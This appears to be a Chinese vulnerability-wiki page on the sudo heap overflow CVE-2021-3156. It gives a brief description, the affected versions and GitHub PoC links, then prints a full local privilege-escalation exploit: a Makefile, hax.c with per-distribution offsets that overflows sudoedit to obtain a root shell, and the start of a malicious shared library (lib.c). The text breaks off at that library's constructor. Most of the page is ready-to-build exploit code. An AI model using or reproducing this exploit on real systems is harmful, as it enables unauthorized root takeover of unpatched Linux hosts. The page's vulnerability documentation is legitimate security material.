<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="内部使用">
    <link rel="canonical" href="https://secnn.com/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/Linux%20sudo%20%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%20CVE-2021-3156/">
    <link rel="shortcut icon" href="../../favicon.ico">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>Linux sudo 权限提升漏洞 CVE-2021-3156 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
    <link href="../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../js/jquery-3.2.1.min.js"></script>
    <script src="../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "Linux sudo \u6743\u9650\u63d0\u5347\u6f0f\u6d1e CVE-2021-3156", url: "#_top", children: [
              {title: "\u6f0f\u6d1e\u63cf\u8ff0", url: "#_1" },
              {title: "\u6f0f\u6d1e\u5f71\u54cd", url: "#_2" },
              {title: "\u6f0f\u6d1e\u590d\u73b0", url: "#_3" },
          ]},
        ];

    </script>
    <script src="../../js/base.js"></script>
      <script src="../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../Linux%20sudo%20%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%20CVE-2023-22809/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../Linux%20sudo%20%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%20CVE-2023-22809/" class="btn btn-xs btn-link">
        Linux Sudo 权限提升漏洞 CVE-2023-22809
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../Linux%20openvswitch%20%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%20CVE-2022-2639/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../Linux%20openvswitch%20%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%20CVE-2022-2639/" class="btn btn-xs btn-link">
        Linux openvswitch 权限提升漏洞 CVE-2022-2639
      </a>
    </div>
    
  </div>

    

    <h1 id="linux-sudo-cve-2021-3156">Linux sudo 权限提升漏洞 CVE-2021-3156<a class="headerlink" href="#linux-sudo-cve-2021-3156" title="Permanent link">&para;</a></h1>
<h2 id="_1">漏洞描述<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
<p>2021年1月26日，Linux安全工具sudo被发现严重的基于堆缓冲区溢出漏洞。利用这一漏洞，攻击者无需知道用户密码，一样可以获得root权限，并且是在默认配置下。此漏洞已分配为CVE-2021-3156，危险等级评分为7分。</p>
<p>当sudo通过-s或-i命令行选项在shell模式下运行命令时，它将在命令参数中使用反斜杠转义特殊字符。但使用-s或-i标志运行sudoedit时，实际上并未进行转义，从而可能导致缓冲区溢出。因此只要存在sudoers文件（通常是/etc/sudoers），攻击者就可以使用本地普通用户利用sudo获得系统root权限。研究人员利用该漏洞在多个Linux发行版上成功获得了完整的root权限，包括Ubuntu 20.04（sudo 1.8.31）、Debian 10（sudo 1.8.27）和Fedora 33（sudo 1.9.2），并且sudo支持的其他操作系统和Linux发行版也很容易受到攻击。</p>
<h2 id="_2">漏洞影响<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
<div class="highlight"><pre><span></span><code>Sudo 1.8.2 - 1.8.31p2
Sudo 1.9.0 - 1.9.5p1
</code></pre></div>
<h2 id="_3">漏洞复现<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
<p>目前POC已经在Github公开：<a href="https://github.com/blasty/CVE-2021-3156">Linux sudo权限提升漏洞 CVE-2021-3156</a></p>
<p><img alt="img" src="../images/1627098472921-85639abb-364c-4fed-929d-1739cb4128cb.png" /></p>
<p>当前可以验证的Linux环境为</p>
<div class="highlight"><pre><span></span><code> Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31  Debian 10.0 (Buster) - sudo 1.8.27, libc-2.28
</code></pre></div>
<p><strong>这里使用腾讯云中的Ubuntu镜像进行复现</strong></p>
<p><a href=""><img alt="img" src="../images/1627098472850-197fab3c-2c70-48af-969c-e0f4108abe55.png" /></a></p>
<p>使用命令</p>
<p><a href=""><img alt="img" src="../images/1627098472851-ffe05143-de53-4d3d-8607-d825a9f9d76c.png" /></a></p>
<p>[<img alt="img" src="../images/1627098473043-7c4d517c-465d-4261-a02d-549b7e8436c8.png" /></p>
<p>漏洞POC</p>
<p>一个无交互式shell使用的脚本 <a href="https://github.com/Rvn0xsy/CVE-2021-3156-plus">https://github.com/Rvn0xsy/CVE-2021-3156-plus</a></p>
<p><strong>Makefile</strong></p>
<div class="highlight"><pre><span></span><code><span class="nl">all</span><span class="p">:</span>
<span class="w">    </span><span class="n">rm</span><span class="w"> </span><span class="o">-</span><span class="n">rf</span><span class="w"> </span><span class="n">libnss_X</span>
<span class="w">    </span><span class="n">mkdir</span><span class="w"> </span><span class="n">libnss_X</span>
<span class="w">    </span><span class="n">gcc</span><span class="w"> </span><span class="o">-</span><span class="n">std</span><span class="o">=</span><span class="n">c99</span><span class="w"> </span><span class="o">-</span><span class="n">o</span><span class="w"> </span><span class="n">sudo</span><span class="o">-</span><span class="n">hax</span><span class="o">-</span><span class="n">me</span><span class="o">-</span><span class="n">a</span><span class="o">-</span><span class="n">sandwich</span><span class="w"> </span><span class="n">hax</span><span class="p">.</span><span class="n">c</span>
<span class="w">    </span><span class="n">gcc</span><span class="w"> </span><span class="o">-</span><span class="n">fPIC</span><span class="w"> </span><span class="o">-</span><span class="n">shared</span><span class="w"> </span><span class="o">-</span><span class="n">o</span><span class="w"> </span><span class="err">&#39;</span><span class="n">libnss_X</span><span class="o">/</span><span class="n">P0P_SH3LLZ_</span><span class="w"> </span><span class="p">.</span><span class="n">so</span><span class="mf">.2</span><span class="err">&#39;</span><span class="w"> </span><span class="n">lib</span><span class="p">.</span><span class="n">c</span>
<span class="nl">brute</span><span class="p">:</span><span class="w"> </span><span class="n">all</span>
<span class="w">    </span><span class="n">gcc</span><span class="w"> </span><span class="o">-</span><span class="n">DBRUTE</span><span class="w"> </span><span class="o">-</span><span class="n">fPIC</span><span class="w"> </span><span class="o">-</span><span class="n">shared</span><span class="w"> </span><span class="o">-</span><span class="n">o</span><span class="w"> </span><span class="err">&#39;</span><span class="n">libnss_X</span><span class="o">/</span><span class="n">P0P_SH3LLZ_</span><span class="w"> </span><span class="p">.</span><span class="n">so</span><span class="mf">.2</span><span class="err">&#39;</span><span class="w"> </span><span class="n">lib</span><span class="p">.</span><span class="n">c</span>
<span class="nl">clean</span><span class="p">:</span>
<span class="w">    </span><span class="n">rm</span><span class="w"> </span><span class="o">-</span><span class="n">rf</span><span class="w"> </span><span class="n">libnss_X</span><span class="w"> </span><span class="n">sudo</span><span class="o">-</span><span class="n">hax</span><span class="o">-</span><span class="n">me</span><span class="o">-</span><span class="n">a</span><span class="o">-</span><span class="n">sandwich</span>
</code></pre></div>
<p><strong>hax.c</strong></p>
<div class="highlight"><pre><span></span><code><span class="cm">/**</span>
<span class="cm"> ** CVE-2021-3156 PoC by blasty &lt;peter@haxx.in&gt;</span>
<span class="cm"> ** ===========================================</span>
<span class="cm"> **</span>
<span class="cm"> ** Exploit for that sudo heap overflow thing everyone is talking about.</span>
<span class="cm"> ** This one aims for singleshot. Does not fuck with your system files.</span>
<span class="cm"> ** No warranties.</span>
<span class="cm"> **</span>
<span class="cm"> ** Shout outs to:</span>
<span class="cm"> **   Qualys      - for pumping out the awesome bugs</span>
<span class="cm"> **   lockedbyte  - for coop hax. (shared tmux gdb sessions ftw)</span>
<span class="cm"> **   dsc         - for letting me rack up his electricity bill</span>
<span class="cm"> **   my wife     - for all the quality time we had to skip</span>
<span class="cm"> **</span>
<span class="cm"> **  Enjoy!</span>
<span class="cm"> **</span>
<span class="cm"> **   -- blasty // 20210130</span>
<span class="cm"> **/</span>

<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;string.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdint.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;unistd.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;ctype.h&gt;</span>

<span class="c1">// 512 environment variables should be enough for everyone</span>
<span class="cp">#define MAX_ENVP 512</span>
<span class="cp">#define SUDOEDIT_PATH &quot;/usr/bin/sudoedit&quot;</span>

<span class="k">typedef</span><span class="w"> </span><span class="k">struct</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">target_name</span><span class="p">;</span>
<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">sudoedit_path</span><span class="p">;</span>
<span class="w">    </span><span class="kt">uint32_t</span><span class="w"> </span><span class="n">smash_len_a</span><span class="p">;</span>
<span class="w">    </span><span class="kt">uint32_t</span><span class="w"> </span><span class="n">smash_len_b</span><span class="p">;</span>
<span class="w">    </span><span class="kt">uint32_t</span><span class="w"> </span><span class="n">null_stomp_len</span><span class="p">;</span>
<span class="w">    </span><span class="kt">uint32_t</span><span class="w"> </span><span class="n">lc_all_len</span><span class="p">;</span><span class="w"> </span>
<span class="p">}</span><span class="w"> </span><span class="n">target_t</span><span class="p">;</span>

<span class="n">target_t</span><span class="w"> </span><span class="n">targets</span><span class="p">[]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="p">{</span>
<span class="w">        </span><span class="c1">// Yes, same values as 20.04.1, but also confirmed.</span>
<span class="w">        </span><span class="p">.</span><span class="n">target_name</span><span class="w">    </span><span class="o">=</span><span class="w"> </span><span class="s">&quot;Ubuntu 18.04.5 (Bionic Beaver) - sudo 1.8.21, libc-2.27&quot;</span><span class="p">,</span>
<span class="w">        </span><span class="p">.</span><span class="n">sudoedit_path</span><span class="w">  </span><span class="o">=</span><span class="w"> </span><span class="n">SUDOEDIT_PATH</span><span class="p">,</span>
<span class="w">        </span><span class="p">.</span><span class="n">smash_len_a</span><span class="w">    </span><span class="o">=</span><span class="w"> </span><span class="mi">56</span><span class="p">,</span>
<span class="w">        </span><span class="p">.</span><span class="n">smash_len_b</span><span class="w">    </span><span class="o">=</span><span class="w"> </span><span class="mi">54</span><span class="p">,</span>
<span class="w">        </span><span class="p">.</span><span class="n">null_stomp_len</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">63</span><span class="p">,</span><span class="w"> </span>
<span class="w">        </span><span class="p">.</span><span class="n">lc_all_len</span><span class="w">     </span><span class="o">=</span><span class="w"> </span><span class="mi">212</span>
<span class="w">    </span><span class="p">},</span>
<span class="w">    </span><span class="p">{</span>
<span class="w">        </span><span class="p">.</span><span class="n">target_name</span><span class="w">    </span><span class="o">=</span><span class="w"> </span><span class="s">&quot;Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31&quot;</span><span class="p">,</span>
<span class="w">        </span><span class="p">.</span><span class="n">sudoedit_path</span><span class="w">  </span><span class="o">=</span><span class="w"> </span><span class="n">SUDOEDIT_PATH</span><span class="p">,</span>
<span class="w">        </span><span class="p">.</span><span class="n">smash_len_a</span><span class="w">    </span><span class="o">=</span><span class="w"> </span><span class="mi">56</span><span class="p">,</span>
<span class="w">        </span><span class="p">.</span><span class="n">smash_len_b</span><span class="w">    </span><span class="o">=</span><span class="w"> </span><span class="mi">54</span><span class="p">,</span>
<span class="w">        </span><span class="p">.</span><span class="n">null_stomp_len</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">63</span><span class="p">,</span><span class="w"> </span>
<span class="w">        </span><span class="p">.</span><span class="n">lc_all_len</span><span class="w">     </span><span class="o">=</span><span class="w"> </span><span class="mi">212</span>
<span class="w">    </span><span class="p">},</span>
<span class="w">    </span><span class="p">{</span>
<span class="w">        </span><span class="p">.</span><span class="n">target_name</span><span class="w">    </span><span class="o">=</span><span class="w"> </span><span class="s">&quot;Debian 10.0 (Buster) - sudo 1.8.27, libc-2.28&quot;</span><span class="p">,</span>
<span class="w">        </span><span class="p">.</span><span class="n">sudoedit_path</span><span class="w">  </span><span class="o">=</span><span class="w"> </span><span class="n">SUDOEDIT_PATH</span><span class="p">,</span>
<span class="w">        </span><span class="p">.</span><span class="n">smash_len_a</span><span class="w">    </span><span class="o">=</span><span class="w"> </span><span class="mi">64</span><span class="p">,</span>
<span class="w">        </span><span class="p">.</span><span class="n">smash_len_b</span><span class="w">    </span><span class="o">=</span><span class="w"> </span><span class="mi">49</span><span class="p">,</span>
<span class="w">        </span><span class="p">.</span><span class="n">null_stomp_len</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">60</span><span class="p">,</span><span class="w"> </span>
<span class="w">        </span><span class="p">.</span><span class="n">lc_all_len</span><span class="w">     </span><span class="o">=</span><span class="w"> </span><span class="mi">214</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">};</span>

<span class="kt">void</span><span class="w"> </span><span class="nf">usage</span><span class="p">(</span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">prog</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="n">fprintf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span>
<span class="w">        </span><span class="s">&quot;  usage: %s &lt;target&gt;</span><span class="se">\n\n</span><span class="s">&quot;</span>
<span class="w">        </span><span class="s">&quot;  available targets:</span><span class="se">\n</span><span class="s">&quot;</span>
<span class="w">        </span><span class="s">&quot;  ------------------------------------------------------------</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span>
<span class="w">        </span><span class="n">prog</span>
<span class="w">    </span><span class="p">);</span>
<span class="w">    </span><span class="k">for</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">targets</span><span class="p">)</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">target_t</span><span class="p">);</span><span class="w"> </span><span class="n">i</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;    %d) %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">i</span><span class="p">,</span><span class="w"> </span><span class="n">targets</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">target_name</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">    </span><span class="n">fprintf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span>
<span class="w">        </span><span class="s">&quot;  ------------------------------------------------------------</span><span class="se">\n</span><span class="s">&quot;</span>
<span class="w">        </span><span class="s">&quot;</span><span class="se">\n</span><span class="s">&quot;</span>
<span class="w">        </span><span class="s">&quot;  manual mode:</span><span class="se">\n</span><span class="s">&quot;</span>
<span class="w">        </span><span class="s">&quot;    %s &lt;smash_len_a&gt; &lt;smash_len_b&gt; &lt;null_stomp_len&gt; &lt;lc_all_len&gt;</span><span class="se">\n</span><span class="s">&quot;</span>
<span class="w">        </span><span class="s">&quot;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span>
<span class="w">        </span><span class="n">prog</span>
<span class="w">    </span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">argc</span><span class="p">,</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">argv</span><span class="p">[])</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\n</span><span class="s">** CVE-2021-3156 PoC by blasty &lt;peter@haxx.in&gt;</span><span class="se">\n\n</span><span class="s">&quot;</span><span class="p">);</span>

<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">argc</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="mi">2</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">argc</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="mi">5</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="n">usage</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="mi">-1</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="n">target_t</span><span class="w"> </span><span class="o">*</span><span class="n">target</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">argc</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">2</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="kt">int</span><span class="w"> </span><span class="n">target_idx</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">atoi</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>

<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">target_idx</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">target_idx</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="n">targets</span><span class="p">)</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">target_t</span><span class="p">)))</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;invalid target index</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
<span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="mi">-1</span><span class="p">;</span>
<span class="w">        </span><span class="p">}</span>

<span class="w">        </span><span class="n">target</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">&amp;</span><span class="n">targets</span><span class="p">[</span><span class="w"> </span><span class="n">target_idx</span><span class="w"> </span><span class="p">];</span>
<span class="w">    </span><span class="p">}</span><span class="w">  </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="n">target</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="n">target_t</span><span class="p">));</span>
<span class="w">        </span><span class="n">target</span><span class="o">-&gt;</span><span class="n">target_name</span><span class="w">    </span><span class="o">=</span><span class="w"> </span><span class="s">&quot;Manual&quot;</span><span class="p">;</span>
<span class="w">        </span><span class="n">target</span><span class="o">-&gt;</span><span class="n">sudoedit_path</span><span class="w">  </span><span class="o">=</span><span class="w"> </span><span class="n">SUDOEDIT_PATH</span><span class="p">;</span>
<span class="w">        </span><span class="n">target</span><span class="o">-&gt;</span><span class="n">smash_len_a</span><span class="w">    </span><span class="o">=</span><span class="w"> </span><span class="n">atoi</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
<span class="w">        </span><span class="n">target</span><span class="o">-&gt;</span><span class="n">smash_len_b</span><span class="w">    </span><span class="o">=</span><span class="w"> </span><span class="n">atoi</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
<span class="w">        </span><span class="n">target</span><span class="o">-&gt;</span><span class="n">null_stomp_len</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">atoi</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">]);</span>
<span class="w">        </span><span class="n">target</span><span class="o">-&gt;</span><span class="n">lc_all_len</span><span class="w">     </span><span class="o">=</span><span class="w"> </span><span class="n">atoi</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">4</span><span class="p">]);</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="n">printf</span><span class="p">(</span>
<span class="w">        </span><span class="s">&quot;using target: %s [&#39;%s&#39;] (%d, %d, %d, %d)</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span>
<span class="w">        </span><span class="n">target</span><span class="o">-&gt;</span><span class="n">target_name</span><span class="p">,</span>
<span class="w">        </span><span class="n">target</span><span class="o">-&gt;</span><span class="n">sudoedit_path</span><span class="p">,</span>
<span class="w">        </span><span class="n">target</span><span class="o">-&gt;</span><span class="n">smash_len_a</span><span class="p">,</span>
<span class="w">        </span><span class="n">target</span><span class="o">-&gt;</span><span class="n">smash_len_b</span><span class="p">,</span>
<span class="w">        </span><span class="n">target</span><span class="o">-&gt;</span><span class="n">null_stomp_len</span><span class="p">,</span>
<span class="w">        </span><span class="n">target</span><span class="o">-&gt;</span><span class="n">lc_all_len</span>
<span class="w">    </span><span class="p">);</span>

<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">smash_a</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">calloc</span><span class="p">(</span><span class="n">target</span><span class="o">-&gt;</span><span class="n">smash_len_a</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">2</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">);</span>
<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">smash_b</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">calloc</span><span class="p">(</span><span class="n">target</span><span class="o">-&gt;</span><span class="n">smash_len_b</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">2</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">);</span>

<span class="w">    </span><span class="n">memset</span><span class="p">(</span><span class="n">smash_a</span><span class="p">,</span><span class="w"> </span><span class="sc">&#39;A&#39;</span><span class="p">,</span><span class="w"> </span><span class="n">target</span><span class="o">-&gt;</span><span class="n">smash_len_a</span><span class="p">);</span>
<span class="w">    </span><span class="n">memset</span><span class="p">(</span><span class="n">smash_b</span><span class="p">,</span><span class="w"> </span><span class="sc">&#39;B&#39;</span><span class="p">,</span><span class="w"> </span><span class="n">target</span><span class="o">-&gt;</span><span class="n">smash_len_b</span><span class="p">);</span>

<span class="w">    </span><span class="n">smash_a</span><span class="p">[</span><span class="n">target</span><span class="o">-&gt;</span><span class="n">smash_len_a</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sc">&#39;\\&#39;</span><span class="p">;</span>
<span class="w">    </span><span class="n">smash_b</span><span class="p">[</span><span class="n">target</span><span class="o">-&gt;</span><span class="n">smash_len_b</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sc">&#39;\\&#39;</span><span class="p">;</span>

<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">s_argv</span><span class="p">[]</span><span class="o">=</span><span class="p">{</span>
<span class="w">        </span><span class="s">&quot;sudoedit&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;-s&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">smash_a</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;</span><span class="se">\\</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">smash_b</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span>
<span class="w">    </span><span class="p">};</span>

<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">s_envp</span><span class="p">[</span><span class="n">MAX_ENVP</span><span class="p">];</span>
<span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">envp_pos</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>

<span class="w">    </span><span class="k">for</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">target</span><span class="o">-&gt;</span><span class="n">null_stomp_len</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="n">s_envp</span><span class="p">[</span><span class="n">envp_pos</span><span class="o">++</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&quot;</span><span class="se">\\</span><span class="s">&quot;</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">    </span><span class="n">s_envp</span><span class="p">[</span><span class="n">envp_pos</span><span class="o">++</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&quot;X/P0P_SH3LLZ_&quot;</span><span class="p">;</span>

<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">lc_all</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">calloc</span><span class="p">(</span><span class="n">target</span><span class="o">-&gt;</span><span class="n">lc_all_len</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">16</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">);</span>
<span class="w">    </span><span class="n">strcpy</span><span class="p">(</span><span class="n">lc_all</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;LC_ALL=C.UTF-8@&quot;</span><span class="p">);</span>
<span class="w">    </span><span class="n">memset</span><span class="p">(</span><span class="n">lc_all</span><span class="o">+</span><span class="mi">15</span><span class="p">,</span><span class="w"> </span><span class="sc">&#39;C&#39;</span><span class="p">,</span><span class="w"> </span><span class="n">target</span><span class="o">-&gt;</span><span class="n">lc_all_len</span><span class="p">);</span>

<span class="w">    </span><span class="n">s_envp</span><span class="p">[</span><span class="n">envp_pos</span><span class="o">++</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">lc_all</span><span class="p">;</span>
<span class="w">    </span><span class="n">s_envp</span><span class="p">[</span><span class="n">envp_pos</span><span class="o">++</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span>

<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;** pray for your rootshell.. **</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>

<span class="w">    </span><span class="n">execve</span><span class="p">(</span><span class="n">target</span><span class="o">-&gt;</span><span class="n">sudoedit_path</span><span class="p">,</span><span class="w"> </span><span class="n">s_argv</span><span class="p">,</span><span class="w"> </span><span class="n">s_envp</span><span class="p">);</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div>
<p><strong>lib.c</strong></p>
<div class="highlight"><pre><span></span><code><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;unistd.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;string.h&gt;</span>

<span class="k">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">__attribute__</span><span class="w"> </span><span class="p">((</span><span class="n">constructor</span><span class="p">))</span><span class="w"> </span><span class="n">_init</span><span class="p">(</span><span class="kt">void</span><span class="p">);</span>

<span class="k">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">_init</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
